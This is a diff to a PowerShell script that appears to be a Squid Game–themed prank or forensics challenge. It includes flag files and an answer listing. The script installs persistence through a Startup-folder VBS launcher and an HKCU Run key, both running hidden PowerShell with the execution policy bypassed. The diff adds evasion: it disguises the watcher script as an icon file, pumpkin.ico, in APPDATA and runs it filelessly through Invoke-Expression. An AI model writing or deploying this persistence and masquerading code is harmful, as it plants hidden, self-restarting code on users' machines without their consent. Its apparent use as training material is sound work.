@@ -59,23 +59,24 @@ function Set-RegSound {
 
 function Start-SquidWatcherService {
     #Write-Host "Setting up persistence without admin rights..." -ForegroundColor Yellow
-    
+    $wd = $env:APPDATA
+    $scriptWatchPath = "$wd\pumpkin.ico"
     # Method 1: Startup Folder (no admin required)
     $startupPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("Startup"), "squid_game.vbs")
     $vbsScript = @"
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$env:TEMP\squid_watcher.ps1""", 0, False
+WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$scriptWatchPath""", 0, False
 "@
     $vbsScript | Out-File -FilePath $startupPath -Encoding ASCII
     #Write-Host "Startup entry created: $startupPath" -ForegroundColor Green
     
     # Method 2: Registry Run Key (no admin required)
     $regRunPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\squid_watcher.ps1`""
+    $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptWatchPath`""
     Set-ItemProperty -Path $regRunPath -Name "SquidGameWatcher" -Value $regValue -Force
     #Write-Host "Registry Run key set" -ForegroundColor Green
     
-    # Create the watcher script
+    # Create the Script Watcher When Minimize will play a sound
     $watcherScript = @"
 `$regKey = "HKCU:\AppEvents\Schemes\Apps\.Default\Minimize\.Current"
 `$squidMp3 = Join-Path `$env:TEMP "squid.mp3"
@@ -97,12 +98,14 @@ while (`$true) {
 }
 "@
 
-    $watcherScriptPath = Join-Path $env:TEMP "squid_watcher.ps1"
-    $watcherScript | Out-File -FilePath $watcherScriptPath -Encoding ASCII
+    
+    $watcherScript | Out-File -FilePath $scriptWatchPath -Encoding ASCII
     #Write-Host "Watcher script created: $watcherScriptPath" -ForegroundColor Green
     
     # Start the watcher in background
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watcherScriptPath`"" -WindowStyle Hidden
+   # Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptWatchPath`"" -WindowStyle Hidden
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Get-Content '$scriptWatchPath' -Raw | iex`"" -WindowStyle Hidden
+
     #Write-Host "SquidWatcher service started!" -ForegroundColor Green
 }
 
@@ -517,7 +520,7 @@ catch {
         "$env:TEMP\squid.mp3",
         "$env:TEMP\getout.mp3",
         "$env:TEMP\voice.mp3",
-        "$env:TEMP\squid_watcher.ps1", 
+        "$env:APPDATA\pumpkin.ico", 
         "$env:TEMP\squid_popup.vbs",
         "$env:TEMP\squid_delayed.vbs",
         "$env:TEMP\.squid.png",
@@ -572,7 +575,7 @@ function Get-Answers {
     Write-Host "   - $env:TEMP\squid.mp3" -ForegroundColor White
     Write-Host "   - $env:TEMP\.squid_flag.txt" -ForegroundColor White
     Write-Host "   - $env:APPDATA\Microsoft\Windows\squid_secret.txt" -ForegroundColor White
-    Write-Host "   - $env:TEMP\squid_watcher.ps1" -ForegroundColor White
+    Write-Host "   - $env:APPDATA\pumpkin.ico" -ForegroundColor White
     Write-Host "   - $env:TEMP\squid_popup.vbs" -ForegroundColor White
     Write-Host "   - $env:TEMP\icon_boom.bat" -ForegroundColor White
     Write-Host "   - $startupPath\icon_explosion.bat" -ForegroundColor White
